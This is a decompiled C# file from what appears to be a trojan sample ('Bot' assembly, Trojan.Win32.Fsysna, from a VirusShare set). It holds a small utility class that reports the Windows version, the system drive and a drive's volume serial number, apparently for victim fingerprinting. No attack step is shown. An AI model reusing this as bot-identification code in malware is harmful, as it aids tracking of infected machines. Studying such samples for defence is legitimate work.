// Decompiled with JetBrains decompiler
// Type: Stub.c_Misc
// Assembly: Bot, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 85CBEE6D-9173-48CF-9DE2-C5D6EFA84893
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Fsysna.dosu-c8b1b84f43bfbe7a69a68cc22f61d7b748661a1fe24c157f43f282f251b83c42.exe

using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Stub
{
  internal class c_Misc
  {
    [DllImport("kernel32.dll")]
    private static extern long GetVolumeInformation(
      string PathName,
      StringBuilder VolumeNameBuffer,
      uint VolumeNameSize,
      ref uint VolumeSerialNumber,
      ref uint MaximumComponentLength,
      ref uint FileSystemFlags,
      StringBuilder FileSystemNameBuffer,
      uint FileSystemNameSize);

    public static string GetOS()
    {
      OperatingSystem osVersion = Environment.OSVersion;
      string os = osVersion.Version.ToString();
      string str;
      if (os.Contains("6.1"))
        str = "Windows 7";
      else if (os.Contains("6.2"))
        str = "Windows 8";
      else if (os.Contains("6.0"))
        str = "Windows Vista";
      else if (os.Contains("5.1"))
        str = "Windows XP";
      else if (os.Contains("5.0"))
      {
        str = "Windows 2000";
      }
      else
      {
        if (!os.Contains("5.2"))
          return os;
        str = "Windows 2003";
      }
      return str + " " + osVersion.ServicePack.ToString();
    }

    public static string GetVolumeSerial(string strDriveLetter)
    {
      uint VolumeSerialNumber = 0;
      uint MaximumComponentLength = 0;
      StringBuilder VolumeNameBuffer = new StringBuilder(256);
      uint FileSystemFlags = 0;
      StringBuilder FileSystemNameBuffer = new StringBuilder(256);
      strDriveLetter += ":\\";
      c_Misc.GetVolumeInformation(strDriveLetter, VolumeNameBuffer, (uint) VolumeNameBuffer.Capacity, ref VolumeSerialNumber, ref MaximumComponentLength, ref FileSystemFlags, FileSystemNameBuffer, (uint) FileSystemNameBuffer.Capacity);
      return Convert.ToString(VolumeSerialNumber);
    }

    public static string GetSystemDrive()
    {
      string str = Environment.ExpandEnvironmentVariables("%SystemDrive%");
      return str.Remove(str.Length - 1, 1);
    }
  }
}
